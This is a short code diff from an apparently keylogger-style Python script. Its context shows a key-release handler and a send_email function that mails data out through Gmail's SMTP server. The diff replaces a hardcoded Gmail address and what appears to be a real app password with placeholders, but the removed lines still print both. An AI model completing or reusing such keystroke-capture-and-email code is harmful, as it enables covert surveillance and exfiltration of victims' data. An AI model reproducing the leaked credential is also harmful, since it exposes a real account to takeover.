@@ -41,9 +41,9 @@ def on_release(key):
 def send_email(message):
     smtp_server = "smtp.gmail.com"
     port = 587  # For starttls
-    sender_email = "yogaakash1230@gmail.com"  # Enter your address
-    password = "imlv losw nqpm zbyi"  # Enter your password
-    receiver_email = "yogaakash1230@gmail.com"  # Enter receiver address
+    sender_email = "your_sender_mail_id"  # Enter your address
+    password = "sender_mail_id_password"  # Enter your password
+    receiver_email = "your_receiver_mail_id"  # Enter receiver address
 
     context = ssl.create_default_context()
 
